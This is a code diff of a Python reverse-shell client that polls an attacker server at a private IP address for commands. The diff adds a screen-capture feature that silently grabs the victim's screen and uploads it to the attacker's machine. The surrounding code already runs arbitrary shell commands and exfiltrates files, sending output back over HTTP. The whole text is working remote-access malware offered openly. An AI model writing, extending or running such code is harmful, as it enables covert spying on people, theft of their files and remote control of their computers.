@@ -3,7 +3,11 @@
 import requests
 import subprocess # shell management
 import time
+import tempfile # temp directory library
+import shutil # file operations library
 import os
+
+from PIL import ImageGrab # Image processing library
 
 while True:
     req = requests.get('http://192.168.1.111:8000')
@@ -19,6 +23,18 @@ while True:
             r = requests.post(url, files=files)
         else:
             post_response = requests.post(url='http://192.168.1.111:8000', data='[-] Not able to find the file')
+    elif 'screencap' in command:
+        # creating a temp directory (AppData\Local\Temp)
+        dirpath = tempfile.mkdtemp()
+        # grabbing target image with Pillow
+        ImageGrab.grab().save(dirpath + '\image.jpg','JPEG') # taking and formatting snapshot
+        url = 'http://192.168.1.111:8000/store'
+        files = {'file': open(dirpath + "\image.jpg", 'rb')}
+        r = requests.post(url, files=files) # post to the attacker machine
+        # closing file for avoid deletion of a current image
+        files['file'].close()
+        # deleting temp folder
+        shutil.rmtree(dirpath)
     else:
         CMD = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
         post_response = requests.post(url="http://192.168.1.111:8000", data=CMD.stdout.read())
